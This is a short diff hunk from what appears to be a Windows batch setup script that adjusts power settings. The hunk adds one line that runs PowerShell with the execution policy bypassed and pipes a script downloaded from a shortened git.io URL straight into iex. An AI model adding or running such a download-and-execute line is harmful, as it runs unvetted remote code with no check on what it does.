@@ -450,6 +450,8 @@ cls
 powercfg /S 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c
 powercfg /change monitor-timeout-ac 0
 
+@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JJ8R4'))"
+
 goto reboot
 
 :: Open User preferences to configure administrator/user permissions
